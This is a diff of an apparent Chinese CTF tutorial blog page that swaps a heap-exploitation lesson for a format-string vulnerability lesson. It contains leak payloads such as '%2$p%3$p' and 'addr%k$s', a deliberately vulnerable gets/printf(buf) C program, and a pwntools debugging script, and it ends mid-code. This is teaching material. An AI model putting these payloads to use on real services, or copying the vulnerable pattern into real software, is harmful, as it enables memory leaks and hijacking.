@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="二进制漏洞与利用——堆利用">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="二进制漏洞与利用——格式化字符串漏洞">
 <title>PWN-3</title>
 
 <link rel='canonical' href='https://expl0rer.top/p/pwn-3/'>
 
 <link rel="stylesheet" href="/scss/style.min.84f4364fa3a5758ecded3430d054d555b355a8e9efd1baf1e03c18d73802579f.css"><meta property='og:title' content="PWN-3">
-<meta property='og:description' content="二进制漏洞与利用——堆利用">
+<meta property='og:description' content="二进制漏洞与利用——格式化字符串漏洞">
 <meta property='og:url' content='https://expl0rer.top/p/pwn-3/'>
 <meta property='og:site_name' content='Expl0rer.Ct'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-09-07T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-11-07T13:13:31&#43;00:00'/><meta property='og:image' content='https://expl0rer.top/p/pwn-3/PWN3.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-11-08T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-11-11T10:22:24&#43;00:00'/><meta property='og:image' content='https://expl0rer.top/p/pwn-3/PWN3.png' />
 <meta name="twitter:title" content="PWN-3">
-<meta name="twitter:description" content="二进制漏洞与利用——堆利用"><meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:description" content="二进制漏洞与利用——格式化字符串漏洞"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://expl0rer.top/p/pwn-3/PWN3.png' />
     <link rel="shortcut icon" href="/favicon.ico" />
 <div class="loading">
@@ -734,29 +734,38 @@ unicode: "ece7"
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#linux动态内存管理机制">Linux动态内存管理机制</a>
+    <li><a href="#fmt介绍">FMT介绍</a></li>
+    <li><a href="#格式化字符串漏洞原理的利用">格式化字符串漏洞原理的利用</a>
       <ol>
-        <li><a href="#堆的内存管理机制">堆的内存管理机制</a>
+        <li><a href="#泄露内存案例">泄露内存（案例）</a></li>
+        <li><a href="#泄露指定地址">泄露指定地址</a>
           <ol>
-            <li><a href="#堆块介绍">堆块介绍</a></li>
+            <li><a href="#32位">32位</a></li>
+            <li><a href="#泄露栈上残留的地址">泄露栈上残留的地址</a></li>
+            <li><a href="#泄露任意指定地址got-表">泄露任意指定地址（got 表）</a></li>
+            <li><a href="#64位">64位</a></li>
+            <li><a href="#程序交互演示">程序交互演示</a></li>
           </ol>
         </li>
-        <li><a href="#堆块的管理">堆块的管理</a></li>
-        <li><a href="#堆块的合并操作">堆块的合并操作</a></li>
-        <li><a href="#结构体">结构体</a></li>
-        <li><a href="#各种内存块介绍">各种内存块介绍</a>
-          <ol>
-            <li><a href="#fastbin">Fastbin</a></li>
-            <li><a href="#unsortedbin">Unsortedbin</a></li>
-            <li><a href="#smallbin">Smallbin</a></li>
-            <li><a href="#largebin">Largebin</a></li>
-          </ol>
-        </li>
-        <li><a href="#malloc运行流程">Malloc运行流程</a></li>
-        <li><a href="#堆动态保护机制的小总结">堆动态保护机制的小总结</a></li>
       </ol>
     </li>
-    <li><a href="#堆的调试方法">堆的调试方法</a></li>
+    <li><a href="#数字覆盖">数字覆盖</a>
+      <ol>
+        <li><a href="#任意地址内存覆盖">任意地址内存覆盖</a></li>
+        <li><a href="#覆盖小数字">覆盖小数字</a></li>
+        <li><a href="#覆盖大数字">覆盖大数字</a></li>
+      </ol>
+    </li>
+    <li><a href="#got表劫持">.got表劫持</a>
+      <ol>
+        <li><a href="#劫持方法">劫持方法</a>
+          <ol>
+            <li><a href="#fmtstr_payload函数">fmtstr_payload函数</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#格式化字符串不在栈上的利用方式">格式化字符串不在栈上的利用方式</a></li>
   </ol>
 </nav>
         </div>
@@ -772,8 +781,8 @@ unicode: "ece7"
     <header class="article-header">
         <div class="article-image">
             <a href="/p/pwn-3/">
-                <img src="/p/pwn-3/PWN3_hu_817e5a93f218a6e2.png"
-                        srcset="/p/pwn-3/PWN3_hu_817e5a93f218a6e2.png 800w, /p/pwn-3/PWN3_hu_22548379e62858b4.png 1600w"
+                <img src="/p/pwn-3/PWN3_hu_15c00fd5ce78fdcb.png"
+                        srcset="/p/pwn-3/PWN3_hu_15c00fd5ce78fdcb.png 800w, /p/pwn-3/PWN3_hu_e8141183c0993e41.png 1600w"
                         width="800" 
                         height="450" 
                         loading="lazy"
@@ -809,7 +818,7 @@ unicode: "ece7"
     
         
         <h3 class="article-subtitle">
-            二进制漏洞与利用——堆利用
+            二进制漏洞与利用——格式化字符串漏洞
         </h3>
         
     </div>
@@ -830,7 +839,7 @@ unicode: "ece7"
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025-09-07</time>
+                <time class="article-time--published">2025-11-08</time>
             </div>
         
 
@@ -847,187 +856,329 @@ unicode: "ece7"
     
     
     <p>[TOC]</p>
-<p><strong>前文：以下是我入门PWN的记录，欢迎各位前来观看，小弟领教！</strong></p>
-<p>在前面的章节中，我们已经粗略的了解了栈相关的知识点：
-ROP、shellcode、栈转移等。</p>
-<p>内存中还有一块区域叫做堆（heap）。</p>
-<p>接下来的一整章的内容，我们就来讲堆。</p>
-<blockquote class="alert alert-tip">
+<p>前言：本期有所借鉴其他博主的讲解资料，相较其它章节来说，这里给出的示例会比较多且实践性较强，可以跟着一起来复现。</p>
+<p>内容有所重合，如有侵权随时下架重置。</p>
+<blockquote class="alert alert-warn">
     <blockquote>
-<p>堆章节比较抽象，我还刻意加了很多图，但依旧比栈章节要更加抽象&hellip;，以至于作者也学的迷迷糊糊，看不懂的欢迎来评论区讨论。</p>
+<p>因为示例演示有运行python脚本，会涉及python2代、3代版本的切换使用，记得提前配置好python版本。</p>
 </blockquote></blockquote>
-<h2 id="linux动态内存管理机制">Linux动态内存管理机制
-</h2><p>什么是堆？+</p>
-<p>堆是程序用于分配动态内存的一段内存区域。
-他独立的存在于内存中，介于程序内存 基地址和libc地址之间，<strong>从低地址向高地址生长</strong>，与用户打交道最多。</p>
-<p>带你举个例子理解动态分配内存：</p>
-<p>开一个统计表格，每人最多输入的最大内存长度是4096个字节，按照以往惯性思维去分配的话，你是不是应该每人都在之前填表时就已经分好了内存给他们了，但不是每个人都能用完这4096个字节的，有些人只输入一个字节，那就意味着就有4095个字节的内存区域被浪费，如果每个人都这样做或输入少于最大字节长度的内存的数据，是不是浪费更多？</p>
-<p>对于这种现象的下一步应该是回收，怎么回收？</p>
-<p>那么，有没有一种方法，能让程序根据用户所需要的内存长度大小来分配内存呢？并且不需要我们管理内存呢？有的，在libc中，我们可以通过<code>malloc(size)</code>来给用户分配一段长度为size的内存，通过<code>free(ptr)</code>来释放这段内存区域。
-这些数据，被统一的存放在了堆中，维护这些数据的运行机制在glibc中，称之为<code>ptmalloc</code>。</p>
-<h3 id="堆的内存管理机制">堆的内存管理机制
-</h3><p>堆是真无敌恶心&hellip;.堆的管理机制相比于栈十分复杂，可以算是对我这样0基础的萌新杀手。</p>
-<p>但是堆的漏洞比栈有更多的形式和利用方式，而且堆漏洞所需要的条件比栈更
-少。
-一般情况下栈溢出起码需要16个字节，也就是至少溢出到返回地址才能利用，但是堆的话只需要一个字节就可完成利用，甚至这个字节可以是个\x00,也就是空字节，nullbyte。</p>
-<blockquote class="alert alert-tip">
-    <blockquote>
-<p>栈的话基本都会关闭一两个保护机制，堆的话一般全开。</p>
-<p>CTFpwn的主流是堆利用。</p>
-</blockquote></blockquote>
-<h4 id="堆块介绍">堆块介绍
-</h4><h5 id="chunk">chunk
-</h5><p>在了解ptmalloc的内存管理机制前，我们先了解一下堆块在内存中的存储形式。在内存中，堆是以一个个堆块构成的,这些堆块称之为chunk。</p>
-<p>在64位系统中，堆块的大小是8字节对齐的,也就是说，我们申请一个15字节长度的堆块，实际到我们手中的用户可控的数据区域大小为16字节。</p>
-<p>但是在管理中，一个堆块除了用户数据区外，还有头部字段，头部字段的长度为16字节。同时在64位系统中，一个堆块最小长度为32字节（包括头部），也就是说，我们分配一个1字节的堆块，他的实际长度是32字节。</p>
+<h2 id="fmt介绍">FMT介绍
+</h2><p>格式化字符串函数：将计算机内存中表示的数据转化为我们人类可读的字符串格式。</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>函数</th>
+          <th>介绍</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>printf</td>
+          <td>输出到stdout</td>
+      </tr>
+      <tr>
+          <td>fprintf</td>
+          <td>输出到指定FILE流</td>
+      </tr>
+      <tr>
+          <td>vprintf</td>
+          <td>根据参数列表格式化输出道stdout</td>
+      </tr>
+      <tr>
+          <td>vfprintf</td>
+          <td>根据参数列表格式输出道指定FILE流</td>
+      </tr>
+      <tr>
+          <td>sprintf</td>
+          <td>输出到字符串</td>
+      </tr>
+      <tr>
+          <td>snprintf</td>
+          <td>输出到指定字节数到字符串</td>
+      </tr>
+      <tr>
+          <td>vsprintf</td>
+          <td>根据参数列表格式化输出到字符串</td>
+      </tr>
+      <tr>
+          <td>vsnprintf</td>
+          <td>根据参数列表格式化输出指定字节到字符串</td>
+      </tr>
+      <tr>
+          <td>setproctitle</td>
+          <td>设置argv</td>
+      </tr>
+      <tr>
+          <td>syslog</td>
+          <td>输出日志</td>
+      </tr>
+      <tr>
+          <td>err,verr,warn,vwarn等</td>
+          <td>。。。</td>
+      </tr>
+  </tbody>
+</table></div>
+<p>用printf()为例子，第一个参数就是格式化字符串：</p>
 <p><img src="/p/pwn-3/1.png"
-	width="600"
-	height="699"
-	srcset="/p/pwn-3/1_hu_c6a945343d5e6bd0.png 480w, /p/pwn-3/1_hu_edfe0fe933bf2d3e.png 1024w"
+	width="664"
+	height="148"
+	srcset="/p/pwn-3/1_hu_2ee61263459090f6.png 480w, /p/pwn-3/1_hu_70d7a7b51a9df908.png 1024w"
 	loading="lazy"
-	
-		alt="堆块结构图"
 	
 	
 		class="gallery-image" 
-		data-flex-grow="85"
-		data-flex-basis="206px"
+		data-flex-grow="448"
+		data-flex-basis="1076px"
 	
 ></p>
-<p>prev_size和size字段分别代表一个chunk对的大小，大小都是8字节，两个一共16字节，称之为chunk的头部字段。后面的user data区域是用户可以输入数据的地方。</p>
-<p>chunk的大小8字节对齐，所以说对于分配器来说，0x80、0x81、0x82大小的堆块都是一样的，都为0x80大小。</p>
 <blockquote>
-<p>可能你举得有点懵，但这是一种简化表述，核心是<strong>堆块大小必须满足 8 字节对齐</strong>，所以分配器会把不满足的大小调整到最近的 8 字节对齐的大小，这样就会出现多个请求大小对应同一个实际分配大小的情况。</p>
+<p>%d ~ 十进制——输出十进制整数</p>
+<p>%s ~ 字符串——从内存中读取字符串</p>
+<p>%x ~ 十六进制——输出十六进制数</p>
+<p>%c ~ 字符——输出字符</p>
+<p>%p ~ 指针——指针地址</p>
+<p>%n ~ 到目前为止所写的字符数</p>
 </blockquote>
-<p>为了节省空间，将size的最低三个bit设置为三个标志位。</p>
-<blockquote class="alert alert-note">
-    <blockquote>
-<p>从高到低分别为<code>non_main_arena</code>、<code>is_mmap</code>、<code>prev_inuse</code>，这里分别解释一下：</p>
-<p>non_main_arena用来记录当前chunk是否不属于主线程,1表示不属于，0表示属于。</p>
-<p>is_mmap表示当前chunk是否由mmap分配的，1表示属于，0表示不属于。</p>
-<p>prev_inuse用来表示前面紧邻的那个chunk是否正在使用，0表示前面的chunk已经被释放，1表示正在被用户使用。</p>
-</blockquote></blockquote>
-<p><img src="/p/pwn-3/1.png"
-	width="600"
-	height="699"
-	srcset="/p/pwn-3/1_hu_c6a945343d5e6bd0.png 480w, /p/pwn-3/1_hu_edfe0fe933bf2d3e.png 1024w"
-	loading="lazy"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="85"
-		data-flex-basis="206px"
-	
-></p>
-<p>prevsize记录前面一个chunk的大小。这里注意，<strong>prevsize只有在前面的chunk被free掉的时候才生效</strong>，也就是说，只有在prev_inuse为0的时候，系统才把prev_size字段当作prevsize。</p>
-<p>那么其他时候这个字段有用吗？没用的话不就浪费了八个字节？</p>
-<p>有用的！如果chunk正在被使用，那么他会把下一个chunk的prevsize字段当作userdata。充分利用空间。</p>
-<p>也就是说，如果我们申请一个0x80长度大小的区域，系统实际给我们0×90大小（0x10头部），如果我们申请0x88大小的区域，系统同样也会给我们0x90大小的区域（算头部），剩下的8字节，使用nextchunk的prevsize区域。因为，只有当一个chunk被释放的时候，nextchunk的prevsize才真正代表前一个chunk的大小，所以就这么设计了。</p>
-<hr>
-<h5 id="topchunk">topchunk
-</h5><p>topchunk是一个特殊的chunk，类似于bss字段未被分配的内存一样，比较原始的。</p>
-<p>最开始时，程序的堆还未被使用，整个的堆区域属于一个很大的堆块叫做topchunk。当已经被使用的空间不够时，程序就会从topchunk中分割一块出来个程序使用。</p>
-<h3 id="堆块的管理">堆块的管理
-</h3><p>为了保证程序的快速运行，而且方便系统内存管理，所以ptmalloc将释放后的堆块根据其大小分成不同的bin。</p>
-<p>fastbin：大小范围从0x20-0×80</p>
-<p>smallbin：大小范围：0×90-0x400</p>
-<p>Large bin：大小范围：0x410以上</p>
-<p>unsortedbin：未被归类的bin，临时存储用，存放的堆块大小不一定多大，后续详细介绍。</p>
-<p>chunk被free之后如图：</p>
+<h2 id="格式化字符串漏洞原理的利用">格式化字符串漏洞原理的利用
+</h2><p>来看一种攻击案例，最简单的攻击方法，只需要输入一串%s就可以</p>
+<p>%s%s%s%s%s%s%s%s%s%s%s%s%s%s</p>
+<p>学过C语言都知道，每一个%s，会使printf()从栈上取一个数字，把该数字看做成地址，接着打印出该地址所指向的<strong>内存内容</strong>，这不就是隔山打牛吗？一个%s就能窃取隔壁的东西，有时这不太可取，万一你获取的数字是非法地址？所以有可数字对应的内容可能不存在，或者这个地址被保护的，那么程序就会因此崩溃或者停滞不前。</p>
+<p>在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况：</p>
+<ul>
+<li>当前字符不是%，直接输出到相应标准输出。</li>
+<li>当前字符是%，继续读取下一个字符
+一如果没有字符，报错
+一如果下一个字符是%,输出%
+一否则根据相应的字符，获取相应的参数，对其进行解析并输出</li>
+</ul>
+<blockquote>
+<p>在Linux中，存取无效的指针会引起进程收到<code>SIGSEGV信号</code>，从而使程序非正常终止并产生核心转储。</p>
+</blockquote>
+<p>用人话说就是：格式化字符串函数就是将计算机内存中表示的数据转化成我们人类可读的字符串格式。</p>
+<h3 id="泄露内存案例">泄露内存（案例）
+</h3><p>一个例子，在一个32位程序的栈上：%x$p将以16进制的方式输出。</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>0x8</th>
+          <th>0x28</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>0x10</td>
+          <td>0xFFFF1234</td>
+      </tr>
+      <tr>
+          <td>0x18</td>
+          <td>0xFFFF1235</td>
+      </tr>
+      <tr>
+          <td>0x20</td>
+          <td>0xFFFF1236</td>
+      </tr>
+      <tr>
+          <td>0x28</td>
+          <td>%2$p%3$p</td>
+      </tr>
+      <tr>
+          <td>0x30</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>0x38</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>0x40</td>
+          <td></td>
+      </tr>
+  </tbody>
+</table></div>
+<p>在0x28上注入了%2$p%3$p，利用printf就会输出0xFFFF12350xFFFF1236</p>
+<h3 id="泄露指定地址">泄露指定地址
+</h3><h4 id="32位">32位
+</h4><p>一般我们所读取的格式化字符串都是在栈上的，也就是说，在调用输出函数的时候，其实，第一个参数的值其实就是该格式化字符串的地址。</p>
+<p>由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第k个参数。那我们就可以通过如下的方式来获取某个指定
+地址addr的内容：<strong>addr%k$s</strong></p>
+<p>在0x80102048地址中存储着hello字符串：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th style="text-align: left">0x80102048</th>
+          <th>hello</th>
+      </tr>
+  </thead>
+  <tbody>
+  </tbody>
+</table></div>
+<p>往0x28注入 %4$s：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>0x8</th>
+          <th>0x28</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>0x10</td>
+          <td>0xFFFF1234</td>
+      </tr>
+      <tr>
+          <td>0x18</td>
+          <td>0xFFFF1235</td>
+      </tr>
+      <tr>
+          <td>0x20</td>
+          <td>0xFFFF1236</td>
+      </tr>
+      <tr>
+          <td>0x28</td>
+          <td>p32(0x80102048)</td>
+      </tr>
+      <tr>
+          <td>0x30</td>
+          <td>%4$s</td>
+      </tr>
+      <tr>
+          <td>0x38</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>0x40</td>
+          <td></td>
+      </tr>
+  </tbody>
+</table></div>
+<p>此时printf就会读取0x28上的第四个数据的字符串，因为0x80102048地址存储的是“hello”字符串，那么顺其自然就输出hello了。</p>
+<p>总结两种方法核心区别：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>维度</th>
+          <th>第一种方法（栈上残留地址）</th>
+          <th>第二种方法（got表地址）</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>读取对象</td>
+          <td>栈上已存在的数据（残留地址）</td>
+          <td>任意指定地址（got 表）的数据</td>
+      </tr>
+      <tr>
+          <td>依赖条件</td>
+          <td>栈上有 libc 相关地址残留</td>
+          <td>已知 got 表地址，且函数已动态绑定</td>
+      </tr>
+      <tr>
+          <td>用途</td>
+          <td>快速泄漏 libc 基地址（需已知版本）</td>
+          <td>泄漏地址 + 反查 libc 版本</td>
+      </tr>
+      <tr>
+          <td>操作对象</td>
+          <td>只需要找偏移</td>
+          <td>需要找got地址+偏移</td>
+      </tr>
+  </tbody>
+</table></div>
+<p>在漏洞利用中，两种方法常结合使用：先用第二种方法泄漏 got 表地址确定 libc 版本，再用第一种方法快速获取其他关键地址，或直接通过 got 表地址构造后续攻击（如修改 got 表实现函数劫持）。</p>
+<p>讲得很清晰了╮(╯＿╰)╭&hellip;&hellip;</p>
+<p>那么这个是怎么应用在漏洞利用当中呢？格式化字符串漏洞一般都是和栈溢出漏洞联动的，可以当场是栈溢出漏洞利用中的一小环节：</p>
+<ol>
+<li>泄漏栈上残留的Iibc地址：通过先确定偏移，然后使用第一种方法输出即可。</li>
+<li>泄漏got表中的libc地址：
+通过第二种方法输出，地址注意填为一个已经进行过绑定的函数的got地址。</li>
+</ol>
+<p>优劣对比：</p>
+<ol>
+<li>需要已知libc版本，因为一般无法通过栈上残留的Iibc地址确定libc版本（这种方法不需要知道got表地址）。</li>
+<li>需要已知got表地址，因为我们需要将got表地址写入栈中（这种方法可以用于查询Iibc版本）。</li>
+</ol>
+<p>直接来上程序案例演示，C源代码（格式化字符串漏洞）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x30</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>程序编译（不用理会编译警告）： <a class="link" href="fmt_32" >fmt_32</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc fmt.c -o fmt_32 -g -no-pie -m32
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>exp：</p>
 <p><img src="/p/pwn-3/2.png"
-	width="608"
-	height="706"
-	srcset="/p/pwn-3/2_hu_9e37b4c47dc91d38.png 480w, /p/pwn-3/2_hu_3d5602cb30b1dc73.png 1024w"
-	loading="lazy"
-	
-		alt="堆释放示意图"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="86"
-		data-flex-basis="206px"
-	
-></p>
-<p>由于chunk被free了，所以按常理说用户不应该能够访问到这个chunk。于是乎在userdata区域存放一些用于管理内存的指针信息。</p>
-<p>fastbin：单链表结构，只会用到fd这个指针；</p>
-<p>small &amp;unsortedbin：双向链表结构，fd和bk都用；</p>
-<p>largebin：双向链表，fd、bk都用，同时还会用fd nextsize和bk nextsize。</p>
-<h3 id="堆块的合并操作">堆块的合并操作
-</h3><p>如果我们free掉一个堆块，（可能）会触发向前合并和向后合并。</p>
-<p><img src="/p/pwn-3/2.png"
-	width="608"
-	height="706"
-	srcset="/p/pwn-3/2_hu_9e37b4c47dc91d38.png 480w, /p/pwn-3/2_hu_3d5602cb30b1dc73.png 1024w"
-	loading="lazy"
-	
-		alt="堆"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="86"
-		data-flex-basis="206px"
-	
-></p>
-<p>向前合并：检查当前chunk的prev inuse位，如果为0，则根据当前chunk的prev size找到prev chunk的头，两个堆块合并；</p>
-<p>向后合并：检查当前chunk的next next chunk的prev inuse位（因为一个堆块的状态由他后面chunk的prev inuse位决定，所以确定next chunk的状态需要检查next next chunk的prev inuse位，怎么找? size就行），然后根据next chunk的状态决定是否合并。</p>
-<p>变化示意图：</p>
-<p><img src="/p/pwn-3/3.png"
-	width="549"
-	height="690"
-	srcset="/p/pwn-3/3_hu_3e940d845dbc5926.png 480w, /p/pwn-3/3_hu_312b3e9f07d6e5d2.png 1024w"
+	width="786"
+	height="159"
+	srcset="/p/pwn-3/2_hu_22120767d0a1bf45.png 480w, /p/pwn-3/2_hu_d5e180d9a95f32f2.png 1024w"
 	loading="lazy"
 	
 	
 		class="gallery-image" 
-		data-flex-grow="79"
-		data-flex-basis="190px"
+		data-flex-grow="494"
+		data-flex-basis="1186px"
 	
 ></p>
-<hr>
-<p><img src="/p/pwn-3/4.png"
-	width="514"
-	height="700"
-	srcset="/p/pwn-3/4_hu_4c5c79d1e71a5cc8.png 480w, /p/pwn-3/4_hu_394cc2401ee65f45.png 1024w"
+<p>给_printf的调用地址断点调试：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./fmt_32&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;b *0x80484F4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span><span class="c1">#b:break(断点)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/pwn-3/3.png"
+	width="1918"
+	height="879"
+	srcset="/p/pwn-3/3_hu_f3c1157db7031af0.png 480w, /p/pwn-3/3_hu_4f37b98f783c1e16.png 1024w"
 	loading="lazy"
+	
+		alt="gdb调试界面"
 	
 	
 		class="gallery-image" 
-		data-flex-grow="73"
-		data-flex-basis="176px"
+		data-flex-grow="218"
+		data-flex-basis="523px"
 	
 ></p>
-<hr>
-<p><img src="/p/pwn-3/5.png"
-	width="435"
-	height="701"
-	srcset="/p/pwn-3/5_hu_6f7258d5a1b19d23.png 480w, /p/pwn-3/5_hu_4f4b1d7c5324c890.png 1024w"
-	loading="lazy"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="62"
-		data-flex-basis="148px"
-	
-></p>
-<hr>
-<p>这四张图看得有点懵？说人话就是prev_inuse=0说明前面chunk被释放了，呃身体都没了你要头有什么用？我的话过重了&hellip;身体（chunk）被释放free没了应该头也跟着一起灰飞烟灭！！一起消失掉，和其它堆合并。（<strong>先向前合并再考虑向后合并</strong>）</p>
-<blockquote class="alert alert-note">
-    <blockquote>
-<p>“合并” 的关系</p>
-<p>向前合并（关键关联 <code>prev_inuse = 0</code>）</p>
-<p>若当前堆块的 <code>prev_inuse = 0</code> 时，说明<strong>前一个堆块是空闲的</strong>。此时，当前堆块可以：</p>
-<p>1、读取前一个堆块的头部信息（通过当前堆块的 <code>prev_size</code> 字段，获取前一个堆块的大小）。</p>
-<p>2、将 “当前堆块” 与 “前一个空闲堆块” 合并，形成一个更大的空闲堆块，减少内存碎片。</p>
-<p>向后合并（与 <code>prev_inuse</code> 无直接关联）</p>
-<p>1、“向后合并” 是指<strong>当前空闲堆块</strong>与<strong>后一个相邻的空闲堆块</strong>合并，其判断条件是：<strong>后一个堆块是否为空闲</strong>（通过检查后一个堆块的 <code>prev_inuse</code> 标志）。</p>
-<p>For instace，当前堆块是空闲的，若后一个堆块的 <code>prev_inuse = 0</code>（说明后一个堆块认为 “前一个堆块（即当前堆块）是空闲的”），则可以进行向后合并。</p>
-<p>2、可见，“向后合并” 的核心是<strong>后一个堆块的 <code>prev_inuse</code> 标志</strong>，而非当前堆块的 <code>prev_inuse</code>。</p>
-<p><strong>考虑到相对关系，简单来说对于当前你要讨论的堆头部来说，它的prev_inuse=0时，它本身就应该和前面的chunk合并。</strong></p>
-<p>而“向后合并” 的触发条件是后一个堆块的 prev_inuse = 0（表示后一个堆块允许与前一个堆块 —— 即当前堆块 —— 合并）。</p>
-</blockquote></blockquote>
-<h3 id="结构体">结构体
-</h3><p><code>aren</code></p>
-<p>是一块结构体，用于管理bins。主线程创建的arena称之为main_arena,其他的叫threadarena。</p>
+<h4 id="泄露栈上残留的地址">泄露栈上残留的地址
+</h4><p>现在先尝试第一种方法，泄露栈上残留的地址，输入stack 30看栈情况：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1053,72 +1204,505 @@ ROP、shellcode、栈转移等。</p>
 </span><span class="lnt">21
 </span><span class="lnt">22
 </span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">malloc</span> <span class="n">state</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">	<span class="cm">/* Serialize access.*/</span>
-</span></span><span class="line"><span class="cl">	<span class="kt">mutex_t</span> <span class="n">mutex</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">flags</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="cm">/*Fastbins*/</span>
-</span></span><span class="line"><span class="cl">	<span class="n">mfastbinptr</span> <span class="n">fastbinsY</span><span class="p">[</span><span class="n">NFASTBINS</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">	<span class="cm">/* Base of the topmost chunk -- not otherwise kept in a bin*/</span>
-</span></span><span class="line"><span class="cl">	<span class="n">mchunkptr</span> <span class="n">top</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">	<span class="cm">/* The remainder from the most recent split of a small request */</span>
